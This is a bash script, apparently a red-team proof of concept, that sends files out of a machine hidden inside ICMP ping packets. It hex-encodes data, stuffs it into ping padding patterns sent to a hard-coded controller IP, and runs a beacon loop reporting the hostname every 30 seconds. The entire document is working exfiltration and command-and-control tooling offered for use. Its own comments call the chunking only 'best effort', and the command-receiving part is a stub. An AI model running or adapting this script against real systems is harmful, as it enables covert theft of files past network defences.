#!/bin/bash

# Configuration
CONTROLLER_IP="172.23.30.36"  # CHANGE THIS to match your controller IP
MAGIC="EXFIL"
# Hex representation of MAGIC (EXFIL) -> 455846494c
MAGIC_HEX="455846494c"

function encode_data() {
    # Echo data -> base64 -> hex -> remove newlines
    echo -n "$1" | base64 | xxd -p | tr -d '\n'
}

function send_packet() {
    local type="$1"
    local data="$2"
    
    # Construct payload: MAGIC_HEX + Type_HEX + Data_HEX
    local type_hex=$(echo -n "$type" | xxd -p)
    local payload="${MAGIC_HEX}${type_hex}${data}"
    
    # Pad payload to be even length for ping -p (which takes up to 16 bytes? No, patterns are small)
    # Actually standard ping -p is for "pad bytes" pattern, limited size.
    # Linux ping -p fills the packet with the pattern.
    # So we can't send arbitrary long data easily with just ping -p if the pattern repeats.
    # We need to use -s size and -p pattern? No.
    
    # ALTERNATIVE: Use padding bytes to hide data?
    # Or just standard ping data? Linux `ping` allows padding pattern but it repeats.
    # If we want to send specific data, we might need to be clever.
    
    # Method: We will use the pattern to send data chunk by chunk.
    # Linux ping -p takes up to 16 bytes.
    # So we send 16 bytes of data per packet.
    
    # Loop through payload in 16-byte (32 hex char) chunks
    local len=${#payload}
    
    for (( i=0; i<len; i+=32 )); do
        local chunk="${payload:$i:32}"
        # If chunk is less than 32 chars, pad with 0s
        while [ ${#chunk} -lt 32 ]; do
            chunk="${chunk}00"
        done
        
        # Send ping with pattern
        # -c 1: count 1
        # -p: pattern
        # -s 16: packet size (enough to fit pattern)
        ping -c 1 -p "$chunk" -s 16 "$CONTROLLER_IP" > /dev/null 2>&1
        # Note: Controller needs to re-assemble these repeating patterns or handle them.
        # Our controller expects full payload in one packet.
        # This bash script is a "best effort" using standard tools.
        # Ideally, we would use /dev/tcp but that's TCP.
        
        # NOTE: This is a limitation of pure bash with standard ping.
        # A real red teamer would use Python/Perl/Ruby/Netcat if available.
        # Assuming minimal install, we use this chunking method.
    done
}

function beacon() {
    while true; do
        local info=$(uname -n)
        local encoded=$(encode_data "$info")
        send_packet "B" "$encoded"
        
        # Check for commands?
        # Requires tcpdump to listen.
        if command -v tcpdump &> /dev/null; then
            # Listen for 5 seconds
            # Filter for ICMP from Controller
            # Hex dump output
            # This is complex to parse in pure bash, simplifying for this POC
            true
        fi
        
        sleep 30
    done
}

function exfiltrate() {
    local file="$1"
    if [ ! -f "$file" ]; then
        echo "File not found"
        return
    fi
    
    echo "[*] Exfiltrating $file..."
    
    # File content -> data
    local content=$(cat "$file")
    local encoded=$(encode_data "$content")
    
    # Send as 'D' (data)
    # We should send metadata first but simplifying for bash constraint
    # Just sending raw data for now
    
    send_packet "D" "$encoded"
    echo "[+] Done"
}

# Main
if [ "$1" == "" ]; then
    beacon
else
    exfiltrate "$1"
fi
